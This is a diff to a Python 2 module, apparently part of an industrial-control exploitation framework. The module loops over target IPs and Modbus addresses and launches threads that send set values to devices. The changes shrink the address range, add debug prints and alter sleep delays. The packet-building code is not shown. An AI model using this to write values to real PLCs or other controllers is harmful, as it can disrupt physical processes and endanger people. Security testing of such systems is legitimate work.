@@ -34,21 +34,24 @@ class Module:
 		ip = ''
 		for ip in ipcalc.Network(self.options['RHOSTS'][0]):
 			ips.append(str(ip))
+		count = 0
 		while ips:
-			for OutputAddr in range(0, 65536):
+			for OutputAddr in range(0, 200):#65536
+				count += 1
+				print 'The ' + str(count) + ' times:'
 				for OutputValue in [2232]:
 					for i in range(int(self.options['Threads'][0])):
 						if (len(ips) > 0):
-							if OutputAddr in [1,2,3,4,5,6,7,8,9,10,11,12,13]:
+							if OutputAddr in [1,2,3,4,5,6,7]:
 								# print type(ips.pop(0))
-								if OutputAddr == 65535:
+								if OutputAddr == 200:
 									thread = threading.Thread(target=self.do,args=(ips.pop(0), str(OutputAddr), str(1234)))
 								thread = threading.Thread(target=self.do, args=(str(ip), str(OutputAddr), str(1234)))
 								thread.start()
 								THREADS.append(thread)
 							else:
 								# print type(ips.pop(0))
-								if OutputAddr == 65535:
+								if OutputAddr == 200:
 									thread = threading.Thread(target=self.do,
 															  args=(ips.pop(0), str(OutputAddr), str(OutputValue)))
 								thread = threading.Thread(target=self.do,
@@ -59,7 +62,7 @@ class Module:
 							break
 					for thread in THREADS:
 						thread.join()
-				time.sleep(1.5)
+				#time.sleep(1.5)
 		if(self.options['Output'][0]):
 			open(mainPath + '/Output/' + moduleName + '_' + self.options['RHOSTS'][0].replace('/','_') + '.txt','a').write('='*30 + '\n' + self.output + '\n\n')
 		self.output 	= ''
@@ -72,8 +75,7 @@ class Module:
 			print str.replace('[-]',color + '[+]' + bcolors.ENDC)
 		else:
 			print str
-
-	def do(self,ip,OutputAddr,OutputValue):
+	def do(self, ip, OutputAddr, OutputValue):
 		c = connectToTarget(ip,self.options['RPORT'][0])
 		if(c == None):
 			self.printLine('[-] Modbus is not running on : ' + ip,bcolors.WARNING)
@@ -83,7 +85,7 @@ class Module:
 		ans = ModbusADU_Answer(str(ans))
 		self.printLine('[+] Response is :',bcolors.OKGREEN)
 		ans.show()
-		time.sleep(3)
+		time.sleep(10)
 				
 if __name__ == '__main__':
 	m = Module()
